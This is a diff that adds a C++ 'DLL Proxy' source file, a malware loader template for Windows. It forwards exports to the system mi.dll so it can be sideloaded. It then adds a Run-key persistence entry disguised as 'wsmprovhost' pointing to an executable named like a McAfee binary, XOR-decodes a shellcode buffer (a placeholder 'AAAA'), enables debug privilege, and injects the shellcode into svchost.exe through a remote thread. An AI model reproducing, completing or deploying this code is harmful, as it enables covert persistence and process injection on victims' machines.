@@ -1,0 +1,175 @@
+// DLL Proxy
+#include <windows.h>
+#include <Shellapi.h>
+#include <tchar.h>
+#include "pch.h"
+#include <stdio.h>
+#include <thread>
+#include "direct.h"
+#include <Shlobj.h>
+#include <Shlwapi.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+
+
+#pragma comment(linker, "/export:MI_Application_InitializeV1=C:\\Windows\\System32\\mi.MI_Application_InitializeV1")
+#pragma comment(linker, "/export:mi_clientFT_V1=C:\\Windows\\System32\\mi.mi_clientFT_V1")
+
+std::thread hookthread;
+char shellcode[] = \
+"AAAA"
+;
+
+int findMyProc(const char* procname) {
+
+	HANDLE hSnapshot;
+	PROCESSENTRY32 pe;
+	int pid = 0;
+	BOOL hResult;
+
+	// snapshot of all processes in the system
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+
+	// initializing size: needed for using Process32First
+	pe.dwSize = sizeof(PROCESSENTRY32);
+
+	// info about first process encountered in a system snapshot
+	hResult = Process32First(hSnapshot, &pe);
+
+	// retrieve information about the processes
+	// and exit if unsuccessful
+	while (hResult) {
+		// if we find the process: return process ID
+		if (strcmp(procname, pe.szExeFile) == 0) {
+			pid = pe.th32ProcessID;
+			break;
+		}
+		hResult = Process32Next(hSnapshot, &pe);
+	}
+
+	// closes an open handle (CreateToolhelp32Snapshot)
+	CloseHandle(hSnapshot);
+	return pid;
+}
+
+BOOL EnableDebugPriv()
+{
+	HANDLE hToken;
+	LUID luid;
+	TOKEN_PRIVILEGES tkp;
+
+	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
+
+	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
+
+	tkp.PrivilegeCount = 1;
+	tkp.Privileges[0].Luid = luid;
+	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	if (!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL)) {
+		return false;
+	};
+
+	CloseHandle(hToken);
+	return true;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+	switch (fdwReason)
+	{
+	case DLL_PROCESS_ATTACH: {
+		// Delete Wrapper
+		HKEY hkey = NULL;
+		LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", 0, KEY_WRITE, &hkey);
+		if (res == ERROR_SUCCESS) {
+			char value[255] = { 0 };
+			DWORD BufferSize = 255;
+			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", "4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+			Sleep(100);
+			if (value[0] != 0) {
+				remove(value);
+				RegSetValueEx(hkey, (LPCSTR)"4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", 0, REG_SZ, NULL, NULL);
+			}
+			else {
+			}
+			RegCloseKey(hkey);
+		}
+		char path[200];
+		_getcwd(path, 200);
+		HKEY hkey2 = NULL;
+		strcat_s(path, "\\mfehcs.exe");
+		const char* exe = path;
+		// startup
+		LONG res2 = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey2);
+		if (res2 == ERROR_SUCCESS) {
+			char value[255] = { 0 };
+			DWORD BufferSize = 255;
+			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "wsmprovhost", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+			if (value[0] != 0) {
+			}
+			else {
+				RegSetValueEx(hkey2, (LPCSTR)"wsmprovhost", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
+			}
+			RegCloseKey(hkey2);
+		}
+		// XOR shellcode
+		char key[] = "KVEcSujcUCK8hJahx92r3JLELBKPLIE2o5kgnJLD4Hbt7LPW1Oie4z";
+		int keysize = sizeof(key);
+		int i;
+		for (i = 0; i < sizeof(shellcode); i++) {
+			shellcode[i] = key[i % keysize] ^ shellcode[i];
+		}
+		// Inject
+
+		int id = GetCurrentProcessId();
+		int pid = findMyProc("svchost.exe");
+		// int pid = 3312;
+		srand(clock());
+		// int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
+		// Sleep(num);
+		HANDLE processHandle;
+		HANDLE remoteThread;
+		PVOID remoteBuffer;
+		EnableDebugPriv();
+		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+		if (processHandle == NULL) {
+			DWORD error = GetLastError();
+			char x[100];
+			// _itoa_s(pid, x, 10);
+			sprintf_s(x, "%d", error);
+			MessageBoxA(NULL, x, x, 0);
+		}
+		remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+		WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+		remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+		CloseHandle(processHandle);
+		
+		// Self kill
+		char cid[10];
+		_itoa_s(id, cid, 10);
+		STARTUPINFO siStartupInfo;
+		PROCESS_INFORMATION piProcessInfo;
+		memset(&siStartupInfo, 0, sizeof(siStartupInfo));
+		memset(&piProcessInfo, 0, sizeof(piProcessInfo));
+		siStartupInfo.cb = sizeof(siStartupInfo);
+		char command[] = "cmd /c taskkill /F /PID";
+		strcat_s(command, cid);
+		// int done = CreateProcess(NULL, (LPTSTR)command, NULL, NULL, TRUE, CREATE_NEW_PROCESS_GROUP, NULL, NULL, &siStartupInfo, &piProcessInfo);
+
+	}
+	case DLL_PROCESS_DETACH:
+		// Code to run when the DLL is freed
+		break;
+
+	case DLL_THREAD_ATTACH:
+		// Code to run when a thread is created during the DLL's lifetime
+		break;
+	case DLL_THREAD_DETACH:
+		// Code to run when a thread ends normally.
+		break;
+	}
+	return TRUE;
+}
+
